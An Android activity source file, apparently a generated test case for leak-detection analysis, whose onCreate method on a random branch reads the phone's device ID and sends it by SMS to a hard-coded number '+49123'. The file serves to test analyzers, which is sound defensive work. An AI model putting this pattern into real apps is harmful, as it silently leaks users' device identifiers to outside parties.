package com.generated.app;

import android.app.Activity;
import android.os.Bundle;
import android.content.Context;
import android.telephony.TelephonyManager;
import android.telephony.SmsManager;

public class MainActivity extends Activity {
  private Context context = this;

  protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity);
    String sensitiveData = "clear";
    if (Math.random() > 0.5) {

    } else {
      TelephonyManager tm0 = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
      sensitiveData = tm0.getDeviceId(); // statementId: 2
      SmsManager sm1 = SmsManager.getDefault();
      sm1.sendTextMessage("+49123", null, sensitiveData, null, null); // statementId: 3

    }
  }

}